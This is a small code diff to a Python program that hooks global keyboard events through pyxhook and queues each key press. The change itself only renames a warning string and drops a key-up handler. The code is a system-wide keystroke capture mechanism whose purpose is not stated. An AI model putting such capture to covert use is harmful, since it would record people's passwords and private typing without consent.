@@ -55,7 +55,7 @@ class Logger(threading.Thread):
         except queue.Empty:
             pass
         except:
-            print(('[WARN] Some exception was caught in the logwriter loop...'), file=sys.stderr)
+            print(('[WARN] Some exception was caught in the Logger loop...'), file=sys.stderr)
             pass
 
     def write_keycode(self):
@@ -67,7 +67,6 @@ class KeyboardLogger:
         self.hm = pyxhook.HookManager()
         self.hm.HookKeyboard()
         self.hm.KeyDown = self.OnKeyDownEvent
-        self.hm.KeyUp = self.OnKeyUpEvent
 
     def spawn_event_threads(self):
         self.event_threads = {}
@@ -97,9 +96,6 @@ class KeyboardLogger:
 
     def OnKeyDownEvent(self, event):
         self.push_event_to_queues(event)
-        return True
-
-    def OnKeyUpEvent(self,event):
         return True
 
     def stop(self):
